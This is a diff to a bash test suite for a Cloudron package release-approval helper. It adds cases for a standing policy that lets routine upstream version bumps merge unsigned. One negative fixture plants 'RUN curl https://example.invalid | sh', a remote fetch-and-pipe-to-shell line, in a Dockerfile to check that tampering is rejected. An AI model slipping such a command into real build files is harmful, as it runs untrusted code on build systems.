@@ -21,7 +21,7 @@ cat >"${TEST_ROOT}/approval-helper.sh" <<'STUB'
 [[ "$*" == 'verify issue 12 owner/app --require-authority' ]] || exit 9
 printf 'verify\n' >>"${TEST_ROOT}/calls"
 case "$SCENARIO" in
-unsigned | request_unsigned | request_retry) printf 'NO_APPROVAL\n'; exit 1 ;;
+unsigned | request_unsigned | request_retry | policy_*) printf 'NO_APPROVAL\n'; exit 1 ;;
 api_error) printf 'API_ERROR\n'; exit 6 ;;
 bad_exit) printf 'VERIFIED\n'; exit 6 ;;
 stale) printf 'STALE_APPROVAL\n'; exit 2 ;;
@@ -56,8 +56,8 @@ pull_request_json() {
 	elif [[ "$SCENARIO" == request_retry && -f "${TEST_ROOT}/held-labels" ]]; then
 		labels=$(<"${TEST_ROOT}/held-labels")
 	fi
-	[[ "$SCENARIO" != changed ]] || head="$OTHER_SHA"
-	if [[ -f "${TEST_ROOT}/merged" || "$SCENARIO" == resumed ]]; then
+	[[ "$SCENARIO" != changed && "$SCENARIO" != policy_changed ]] || head="$OTHER_SHA"
+	if [[ -f "${TEST_ROOT}/merged" || "$SCENARIO" == resumed || "$SCENARIO" == policy_resumed ]]; then
 		merged=true
 		state=closed
 	fi
@@ -409,6 +409,58 @@ release_authorize owner/app 7 "$HEAD_SHA"
 if release_authorize owner/app 7 "$OTHER_SHA"; then exit 1; fi
 printf 'PASS common release authorization requires signature and matching head\n'
 
+# GH#37697: an unsigned request releases only through the signed standing
+# policy; the predicate plumbing is exercised separately below.
+(
+	release_policy_authorizes() {
+		printf 'policy-check %s %s %s\n' "$@" >>"${TEST_ROOT}/calls"
+		case "$SCENARIO" in policy_denied | policy_changed | policy_inactive) return 1 ;; esac
+		[[ "$1" == owner/app && "$2" == 7 && "$3" == "$HEAD_SHA" ]] || return 1
+		printf '50\n'
+		return 0
+	}
+	release_policy_active() {
+		[[ "$SCENARIO" != policy_inactive ]] || return 1
+		printf '50\t{}\n'
+		return 0
+	}
+	run_case policy_unsigned 0 true true true
+	grep -q 'authority: standing policy #50' "${TEST_ROOT}/calls"
+	# Proven once to select the path and again immediately before merge.
+	[[ "$(grep -c '^policy-check owner/app 7 ' "${TEST_ROOT}/calls")" -ge 2 ]]
+	printf 'PASS policy: unsigned routine bump merges, publishes and records its authority\n'
+	run_case policy_denied 0 false false false
+	printf 'PASS policy: a non-routine change still waits for a per-release signature\n'
+	run_case stale 0 false false false
+	if grep -q '^policy-check ' "${TEST_ROOT}/calls"; then exit 1; fi
+	run_case api_error 1 false false false
+	if grep -q '^policy-check ' "${TEST_ROOT}/calls"; then exit 1; fi
+	printf 'PASS policy: stale or unverifiable signatures never fall back to the policy\n'
+	run_case policy_resumed 0 false true true
+	printf 'PASS policy: a merged exact head resumes publication verification only\n'
+	run_case policy_changed 0 false true true
+	grep -q 'issue close 12 --repo owner/app --reason not planned' "${TEST_ROOT}/calls"
+	printf 'PASS policy: an unsigned request whose head moved is retired for a fresh request\n'
+	export SCENARIO=policy_inactive
+	: >"${TEST_ROOT}/calls"
+	pull_request_json() {
+		jq -cn --arg head "$OTHER_SHA" '{head:{sha:$head,repo:{full_name:"owner/app"}},base:{ref:"main",repo:{full_name:"owner/app"}},state:"open",merged:false,draft:false,labels:[],auto_merge:null}'
+		return 0
+	}
+	release_process true
+	if grep -q 'issue close' "${TEST_ROOT}/calls"; then exit 1; fi
+	printf 'PASS policy: without an active policy a moved unsigned request is left alone\n'
+	unset -f pull_request_json
+	export SCENARIO=policy_unsigned
+	release_authorize owner/app 7 "$HEAD_SHA"
+	if release_authorize owner/app 7 "$OTHER_SHA"; then exit 1; fi
+	export SCENARIO=policy_denied
+	if release_authorize owner/app 7 "$HEAD_SHA"; then exit 1; fi
+	export SCENARIO=stale
+	if release_authorize owner/app 7 "$HEAD_SHA"; then exit 1; fi
+	printf 'PASS policy: the merge-authority guard accepts only a policy-proven exact head\n'
+)
+
 # Exercise the real final transport-head guard, not just the merge stub.
 SCRIPT_DIR="$SOURCE_DIR"
 # shellcheck source=../full-loop-helper-merge.sh
@@ -715,4 +767,231 @@ printf 'PASS half-hour approval routine registered\n'
 		if grep -Eq '^(request |pr-close |pr-comment |comment )|^gh issue close' "${TEST_ROOT}/calls"; then exit 1; fi
 	done
 	printf 'PASS held: API errors fail closed before any write\n'
+)
+
+# GH#37697: the routine-bump predicate. The fixture mirrors a real upstream-only
+# bump (manifest, Dockerfile pin, changelogs and test assertions).
+b64() {
+	printf '%s' "$1" | base64 | tr -d '\n'
+	return 0
+}
+POLICY_JSON='{"schema":1,"kind":"cloudron-standing-upstream-release","repository":"owner/app","changelog_files":["CHANGELOG","CHANGELOG.md"],"pinned_files":["Dockerfile"],"check_files":["test/package-test.sh"]}'
+BASE_MANIFEST='{"id":"io.example.app","version":"0.1.43","upstreamVersion":"3.39.87","changelog":"file://CHANGELOG"}'
+HEAD_MANIFEST='{"id":"io.example.app","version":"0.1.44","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG"}'
+BASE_DOCKERFILE=$'FROM base@sha256:abc\nARG AIDEVOPS_VERSION=3.39.87\nLABEL version="0.1.43"\n'
+HEAD_DOCKERFILE=$'FROM base@sha256:abc\nARG AIDEVOPS_VERSION=3.39.114\nLABEL version="0.1.44"\n'
+routine_doc() {
+	local filter="${1:-.}"
+	jq -cn --argjson policy "$POLICY_JSON" --arg bm "$(b64 "$BASE_MANIFEST")" --arg hm "$(b64 "$HEAD_MANIFEST")" \
+		--arg bd "$(b64 "$BASE_DOCKERFILE")" --arg hd "$(b64 "$HEAD_DOCKERFILE")" '
+		{policy: $policy, finding_upstream: "3.39.114",
+		 files: [{filename: "CHANGELOG", status: "modified", additions: 3, deletions: 0},
+		         {filename: "CHANGELOG.md", status: "modified", additions: 6, deletions: 0},
+		         {filename: "CloudronManifest.json", status: "modified", additions: 2, deletions: 2},
+		         {filename: "Dockerfile", status: "modified", additions: 2, deletions: 2},
+		         {filename: "test/package-test.sh", status: "modified", additions: 6, deletions: 4}],
+		 contents: {"CloudronManifest.json": {base: $bm, head: $hm}, Dockerfile: {base: $bd, head: $hd}}}
+		| '"$filter"
+	return 0
+}
+assert_routine() {
+	local expected="$1" label="$2" filter="${3:-.}" output="" rc=0
+	output=$(routine_doc "$filter" | python3 "${SOURCE_DIR}/cloudron_routine_bump.py" --repository owner/app) || rc=$?
+	if [[ "$expected" == routine ]]; then
+		[[ "$rc" -eq 0 && "$output" == ROUTINE_BUMP ]] || { printf 'FAIL routine %s: %s\n' "$label" "$output"; return 1; }
+	else
+		[[ "$rc" -eq 1 && "$output" == NOT_ROUTINE:* ]] || { printf 'FAIL not-routine %s rc=%s: %s\n' "$label" "$rc" "$output"; return 1; }
+	fi
+	printf 'PASS predicate %s: %s\n' "$label" "$output"
+	return 0
+}
+manifest_head() {
+	printf '.contents["CloudronManifest.json"].head = "%s"' "$(b64 "$1")"
+	return 0
+}
+dockerfile_head() {
+	printf '.contents.Dockerfile.head = "%s"' "$(b64 "$1")"
+	return 0
+}
+assert_routine routine 'upstream-only bump'
+assert_routine routine 'without a pinned-file change' 'del(.files[3]) | del(.contents.Dockerfile)'
+assert_routine not 'extra file' '.files += [{filename: "start.sh", status: "modified", additions: 1, deletions: 0}]'
+assert_routine not 'added check file' '.files[4].status = "added"'
+assert_routine not 'renamed pinned file' '.files[3].previous_filename = "Dockerfile.old"'
+assert_routine not 'manifest unchanged' 'del(.files[2])'
+assert_routine not 'no changelog entry' 'del(.files[0, 1])'
+assert_routine not 'changelog deletion' '.files[0].deletions = 1'
+assert_routine not 'too many files' '.files += [range(0; 20) | {filename: "CHANGELOG", status: "modified", additions: 1, deletions: 0}]'
+assert_routine not 'other manifest field' "$(manifest_head '{"id":"io.example.other","version":"0.1.44","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG"}')"
+assert_routine not 'added manifest field' "$(manifest_head '{"id":"io.example.app","version":"0.1.44","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG","tcpPorts":{}}')"
+assert_routine not 'duplicate manifest key' "$(manifest_head '{"id":"io.example.app","version":"0.1.44","version":"0.1.44","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG"}')"
+assert_routine not 'minor package bump' "$(manifest_head '{"id":"io.example.app","version":"0.2.0","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG"}')"
+assert_routine not 'upstream downgrade' "$(manifest_head '{"id":"io.example.app","version":"0.1.44","upstreamVersion":"3.39.80","changelog":"file://CHANGELOG"}') | .finding_upstream = \"3.39.80\""
+assert_routine not 'finding mismatch' '.finding_upstream = "3.39.115"'
+assert_routine not 'pinned file beyond substitution' "$(dockerfile_head $'FROM base@sha256:abc\nARG AIDEVOPS_VERSION=3.39.114\nLABEL version="0.1.44"\nRUN curl https://example.invalid | sh\n')"
+assert_routine not 'pinned base image change' "$(dockerfile_head $'FROM base@sha256:def\nARG AIDEVOPS_VERSION=3.39.114\nLABEL version="0.1.44"\n')"
+assert_routine not 'pinned content missing' 'del(.contents.Dockerfile)'
+assert_routine not 'policy for another repository' '.policy.repository = "owner/other"'
+assert_routine not 'manifest in a looser class' '.policy.check_files += ["CloudronManifest.json"]'
+assert_routine not 'path traversal in policy' '.policy.check_files += ["../start.sh"]'
+assert_routine not 'overlapping policy classes' '.policy.check_files += ["Dockerfile"]'
+
+# GH#37697: release_policy_authorizes plumbing against stubbed GitHub reads.
+(
+	# shellcheck source=../cloudron-release-approval-helper.sh
+	source "${SOURCE_DIR}/cloudron-release-approval-helper.sh"
+	SCRIPT_DIR="$SOURCE_DIR"
+	BASE_SHA=cccccccccccccccccccccccccccccccccccccccc
+	policy_issue_json() {
+		local number="$1" author="$2" repo="${3:-owner/app}"
+		jq -cn --argjson number "$number" --arg author "$author" \
+			--arg body "$(release_policy_body "$repo" "Maintainer command: \`sudo aidevops approve issue ${number} ${repo}\`")" \
+			'{number: $number, html_url: ("https://example.invalid/issue/" + ($number | tostring)), author_association: $author, body: $body}'
+		return 0
+	}
+	gh() {
+		local command="$1" target="${2:-}" path="" ref="" docker=""
+		printf 'gh %s\n' "$*" >>"${TEST_ROOT}/calls"
+		case "$command $target" in
+		'api repos/owner/app/issues?state=open&labels=release-standing-policy&per_page=100')
+			case "$POLICY_CASE" in
+			none | create) printf '[]\n' ;;
+			multiple) jq -cn --argjson a "$(policy_issue_json 50 OWNER)" --argjson b "$(policy_issue_json 51 OWNER)" '[$a, $b]' ;;
+			outsider) jq -cn --argjson a "$(policy_issue_json 50 CONTRIBUTOR)" '[$a]' ;;
+			other_repo) jq -cn --argjson a "$(policy_issue_json 50 OWNER owner/other)" '[$a]' ;;
+			unfinished) jq -cn --argjson a "$(policy_issue_json 50 OWNER)" '[$a | .body |= sub("Maintainer command:[^\n]*"; "Policy finalization pending. Do not sign until the maintainer command appears.")]' ;;
+			*) jq -cn --argjson a "$(policy_issue_json 50 OWNER)" '[$a]' ;;
+			esac
+			;;
+		'api repos/owner/app/pulls/7')
+			jq -cn --arg head "$HEAD_SHA" '{state: "open", merged: false, draft: false, author_association: "OWNER",
+				head: {sha: $head, repo: {full_name: "owner/app"}}, base: {ref: "main", repo: {full_name: "owner/app"}}}'
+			;;
+		'pr view') jq -cn --arg head "$HEAD_SHA" '{closingIssuesReferences: [{number: 30}], headRefOid: $head}' ;;
+		'api repos/owner/app/issues/30')
+			printf '{"state":"open","author_association":"OWNER","body":"Finding\\n<!-- aidevops:cloudron-package-monitor upstream-v3.39.114 -->\\n"}\n'
+			;;
+		"api repos/owner/app/compare/main...${HEAD_SHA}")
+			jq -cn --arg base "$BASE_SHA" --arg scenario "$POLICY_CASE" '{merge_base_commit: {sha: $base},
+				files: ([{filename: "CHANGELOG", status: "modified", additions: 3, deletions: 0},
+				         {filename: "CloudronManifest.json", status: "modified", additions: 2, deletions: 2},
+				         {filename: "Dockerfile", status: "modified", additions: 2, deletions: 2}]
+				        + if $scenario == "extra_file" then [{filename: "start.sh", status: "modified", additions: 1, deletions: 0}] else [] end)}'
+			;;
+		'api repos/owner/app/contents/'*)
+			path="${target#repos/owner/app/contents/}"
+			ref="${path##*\?ref=}"
+			path="${path%%\?ref=*}"
+			docker="$HEAD_DOCKERFILE"
+			[[ "$POLICY_CASE" != docker_tamper ]] || docker=$'FROM base@sha256:def\nARG AIDEVOPS_VERSION=3.39.114\nLABEL version="0.1.44"\n'
+			case "${path}@${ref}" in
+			"CloudronManifest.json@${BASE_SHA}") b64 "$BASE_MANIFEST" ;;
+			"CloudronManifest.json@${HEAD_SHA}") b64 "$HEAD_MANIFEST" ;;
+			"Dockerfile@${BASE_SHA}") b64 "$BASE_DOCKERFILE" ;;
+			"Dockerfile@${HEAD_SHA}") b64 "$docker" ;;
+			*) return 1 ;;
+			esac
+			printf '\n'
+			;;
+		'api repos/owner/app/labels?per_page=100') printf 'bug\n' ;;
+		'label create') return 0 ;;
+		*)
+			printf 'Unexpected gh call: %s\n' "$*" >&2
+			return 9
+			;;
+		esac
+		return 0
+	}
+	release_checks() {
+		[[ "$POLICY_CASE" != pending ]] || return 1
+		printf '[]\n'
+		return 0
+	}
+	release_verify() {
+		local repo="$1" issue="$2"
+		printf 'verify %s\n' "$issue" >>"${TEST_ROOT}/calls"
+		case "$POLICY_CASE" in
+		stale) printf 'STALE_APPROVAL\n'; return 2 ;;
+		api_error) printf 'API_ERROR\n'; return 6 ;;
+		unsigned | create | unfinished) printf 'NO_APPROVAL\n'; return 1 ;;
+		esac
+		printf 'VERIFIED\n'
+		return 0
+	}
+	assert_policy() {
+		local case_name="$1" expected_rc="$2" head="${3:-$HEAD_SHA}" output="" rc=0
+		export POLICY_CASE="$case_name"
+		: >"${TEST_ROOT}/calls"
+		output=$(release_policy_authorizes owner/app 7 "$head" 2>"${TEST_ROOT}/policy-err") || rc=$?
+		[[ "$rc" -eq "$expected_rc" ]] || { printf 'FAIL policy %s rc=%s\n' "$case_name" "$rc"; cat "${TEST_ROOT}/policy-err"; return 1; }
+		[[ "$expected_rc" -ne 0 || "$output" == 50 ]] || return 1
+		# Authorization is read-only: no label, comment, close or edit writes.
+		if grep -Eq '^gh (issue|pr) (close|edit|comment|merge)|^gh label' "${TEST_ROOT}/calls"; then return 1; fi
+		printf 'PASS policy authorization %s rc=%s\n' "$case_name" "$rc"
+		return 0
+	}
+	assert_policy verified 0
+	assert_policy docker_tamper 1
+	grep -q 'pinned file changes beyond version substitution' "${TEST_ROOT}/policy-err"
+	assert_policy extra_file 1
+	assert_policy pending 1
+	assert_policy unsigned 1
+	assert_policy stale 1
+	assert_policy api_error 1
+	assert_policy multiple 1
+	assert_policy outsider 1
+	assert_policy other_repo 1
+	assert_policy none 1
+	assert_policy verified 1 "$OTHER_SHA"
+
+	gh_create_issue() {
+		local body=""
+		body=$(</dev/stdin)
+		printf '%s\n' "$body" >"${TEST_ROOT}/policy-body"
+		printf 'create %s\n' "$*" >>"${TEST_ROOT}/calls"
+		printf 'https://example.invalid/issue/50\n'
+		return 0
+	}
+	gh_issue_edit_safe() {
+		local body=""
+		body=$(</dev/stdin)
+		[[ "$*" == '50 --repo owner/app --body-file -' ]] || return 9
+		printf '%s\n' "$body" >"${TEST_ROOT}/policy-body"
+		printf 'issue-edit %s\n' "$*" >>"${TEST_ROOT}/calls"
+		return 0
+	}
+	release_authority() {
+		return 0
+	}
+	expected_policy_output=$'https://example.invalid/issue/50\nAPPROVAL_COMMAND=sudo aidevops approve issue 50 owner/app'
+	export POLICY_CASE=create
+	: >"${TEST_ROOT}/calls"
+	[[ "$(release_policy_request owner/app)" == "$expected_policy_output" ]]
+	grep -q -- '--label release-standing-policy --label no-auto-dispatch' "${TEST_ROOT}/calls"
+	grep -q '^gh label create release-standing-policy --repo owner/app ' "${TEST_ROOT}/calls"
+	[[ "$(release_policy_metadata "$(<"${TEST_ROOT}/policy-body")" owner/app)" == "$POLICY_JSON" ]]
+	# shellcheck disable=SC2016 # Markdown command backticks are literal.
+	grep -q 'Maintainer command: `sudo aidevops approve issue 50 owner/app`' "${TEST_ROOT}/policy-body"
+	grep -qx -- '<!-- aidevops:cloudron-release-policy v1 -->' "${TEST_ROOT}/policy-body"
+	printf 'PASS policy request creates a finalized, parseable approval-only policy issue\n'
+	export POLICY_CASE=verified
+	: >"${TEST_ROOT}/calls"
+	[[ "$(release_policy_request owner/app)" == "$expected_policy_output" ]]
+	if grep -Eq '^(create |issue-edit )|^verify ' "${TEST_ROOT}/calls"; then exit 1; fi
+	printf 'PASS repeated policy request is read-only\n'
+	export POLICY_CASE=unfinished
+	: >"${TEST_ROOT}/calls"
+	[[ "$(release_policy_request owner/app)" == "$expected_policy_output" ]]
+	grep -q '^issue-edit 50 ' "${TEST_ROOT}/calls"
+	printf 'PASS interrupted unsigned policy request is finalized\n'
+	export POLICY_CASE=stale
+	: >"${TEST_ROOT}/calls"
+	gh() {
+		printf 'gh %s\n' "$*" >>"${TEST_ROOT}/calls"
+		jq -cn --argjson a "$(policy_issue_json 50 OWNER)" '[$a | .body |= sub("Maintainer command:[^\n]*"; "Policy finalization pending.")]'
+		return 0
+	}
+	if release_policy_request owner/app 2>/dev/null; then exit 1; fi
+	if grep -q '^issue-edit ' "${TEST_ROOT}/calls"; then exit 1; fi
+	printf 'PASS a signed or stale policy body is never rewritten\n'
 )
